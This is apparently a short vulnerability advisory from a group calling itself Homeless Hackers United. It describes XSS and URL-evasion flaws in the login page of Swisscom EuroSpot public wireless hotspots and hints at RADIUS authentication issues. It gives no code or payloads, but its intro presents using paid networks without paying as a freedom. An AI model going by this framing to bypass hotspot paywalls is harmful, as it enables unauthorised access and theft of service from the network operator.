Homeless Hackers United is a small group of homeless hackers from  
Europe and
North America. We can't afford paying for Internet access or hotel  
rooms.
Our only crime is to have a laptop and wireless card, and few knowledge.
Homeless state give us the freedom to access and use various open  
systems,
accessible from public places.

Who
---
Swisscom EuroSpot is a wireless service offered in airports, hotels and
other public places. Customers buy certain amount of time online and  
get access
to the wireless network. The login page is of course open in order to  
join and
subscribe to the service.
HHU has been able to access, and validate around several hotels and  
public
places.

Severity
--------
Medium

Vulnerability
-------------
XSS, URL evasion

Details
-------
Swisscom access point seems to use radius servers to provide internet  
access to
their customers. We also noticed issues on the radius  
authentification process
that may be published later. After joining the network you will have  
either to
buy access time or login. The following has been tested in UK,  
Germany, France
and Norway.
